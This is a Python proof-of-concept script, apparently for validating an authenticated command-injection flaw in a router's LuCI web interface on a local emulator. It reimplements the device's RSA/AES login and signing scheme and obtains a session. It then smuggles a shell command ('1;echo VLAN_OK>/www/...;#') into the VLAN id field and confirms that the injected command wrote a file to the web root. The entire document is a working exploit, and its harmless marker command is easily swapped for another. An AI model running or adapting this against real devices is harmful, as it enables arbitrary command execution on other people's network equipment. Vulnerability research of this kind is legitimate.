import argparse
import base64
import hashlib
import json
import secrets
from urllib.error import HTTPError
from urllib.request import Request, urlopen
from urllib.parse import quote

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def rsa_encrypt_hex(value, n_hex, e_hex):
    key = RSAPublicNumbers(int(e_hex, 16), int(n_hex, 16)).public_key()
    return key.encrypt(value.encode(), padding.PKCS1v15()).hex().upper()


def aes_crypt(value, key, iv, decrypt=False):
    cipher = Cipher(algorithms.AES(key.encode()), modes.CBC(iv.encode()))
    if decrypt:
        context = cipher.decryptor()
        return context.update(value) + context.finalize()
    pad = 16 - len(value) % 16
    value += bytes([pad]) * pad
    return cipher.encryptor().update(value) + cipher.encryptor().finalize()


class WebCrypto:
    def __init__(self, n_hex, e_hex, seq):
        self.n_hex = n_hex
        self.e_hex = e_hex
        self.seq = int(seq)
        self.key = "".join(secrets.choice("0123456789") for _ in range(16))
        self.iv = "".join(secrets.choice("0123456789") for _ in range(16))

    def pack(self, operation, params, password, renew):
        plain = json.dumps({"operation": operation, "params": params}, separators=(",", ":")).encode()
        data = base64.b64encode(aes_crypt(plain, self.key, self.iv)).decode()
        digest = hashlib.md5(("admin" + password).encode()).hexdigest()
        text = f"h={digest}&s={self.seq + len(data)}"
        if renew:
            text = f"k={self.key}&i={self.iv}&{text}"
        sign = "".join(rsa_encrypt_hex(text[i:i + 53], self.n_hex, self.e_hex) for i in range(0, len(text), 53))
        return f"sign={sign}&data={quote(data, safe='')}".encode()

    def unpack(self, text):
        outer = json.loads(text)
        if "data" not in outer:
            return outer
        padded = aes_crypt(base64.b64decode(outer["data"]), self.key, self.iv, decrypt=True)
        return json.loads(padded[:-padded[-1]].decode())


def post(base_url, path, form, operation, params, crypto=None, password=None, renew=True, cookie=None, return_cookie=False):
    url = f"{base_url}/cgi-bin/luci/;stok=/{path}?form={form}&operation={operation}"
    if crypto:
        body = crypto.pack(operation, params, password, renew)
    else:
        body = json.dumps({"form": form, "operation": operation, "params": params}).encode()
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = "sysauth=" + cookie
    request = Request(url, data=body, headers=headers)
    try:
        with urlopen(request, timeout=45) as response:
            text = response.read().decode(errors="replace")
            result = crypto.unpack(text) if crypto else json.loads(text)
            print(f"POST {form}/{operation}: HTTP {response.status} {json.dumps(result)}")
            if return_cookie:
                set_cookie = response.headers.get("Set-Cookie", "")
                session = set_cookie.split("sysauth=", 1)[-1].split(";", 1)[0]
                if not session:
                    raise RuntimeError("No sysauth session cookie in login response")
                return result, session
            return result
    except HTTPError as error:
        text = error.read().decode(errors="replace")
        if crypto:
            try:
                text = json.dumps(crypto.unpack(text))
            except Exception:
                try:
                    padded = aes_crypt(base64.b64decode(text), crypto.key, crypto.iv, decrypt=True)
                    if padded:
                        text = padded[:-padded[-1]].decode()
                except Exception:
                    pass
        print(f"POST {form}/{operation}: HTTP {error.code} {text}")
        raise


def main():
    parser = argparse.ArgumentParser(description="Validate the authenticated VLAN id command injection in a local emulator")
    parser.add_argument("base_url", help="For example http://127.0.0.1:8080")
    parser.add_argument("--password", default="admin", help="Known password of the local test account")
    parser.add_argument("--login-only", action="store_true")
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    keys = post(base_url, "login", "keys", "read", {})
    encrypted = rsa_encrypt_hex(args.password, *keys["result"]["password"])
    auth = post(base_url, "login", "auth", "read", {})
    crypto = WebCrypto(*auth["result"]["key"], auth["result"]["seq"])
    login, session = post(base_url, "login", "login", "login", {"username": "admin", "password": encrypted},
                          crypto=crypto, password=args.password, return_cookie=True)
    if args.login_only:
        return
    stok = login.get("result", {}).get("stok")
    if not stok:
        raise RuntimeError(f"Login did not return stok: {login}")

    marker = "vlan_" + secrets.token_hex(6)
    payload = f"1;echo VLAN_OK>/www/{marker};#"
    print(f"marker={marker}")
    try:
        urlopen(f"{base_url}/{marker}", timeout=10)
        raise RuntimeError("Marker already existed before the exploit")
    except HTTPError as error:
        if error.code != 404:
            raise
    try:
        post(base_url, f"{stok}/admin/network", "vlan", "write", {"vlan": {"enable": True, "id": payload}},
             crypto=crypto, password=args.password, renew=False, cookie=session)
    except HTTPError as error:
        if error.code != 500:
            raise
        print("The model raised its expected post-command numeric conversion error; checking the marker")
    with urlopen(f"{base_url}/{marker}", timeout=10) as response:
        result = response.read().decode(errors="replace").strip()
        print(f"GET {marker}: HTTP {response.status} body={result!r}")
        if result != "VLAN_OK":
            raise RuntimeError("Marker content mismatch")
        print(f"VALIDATED: authenticated VLAN id command injection wrote /www/{marker}")


if __name__ == "__main__":
    main()
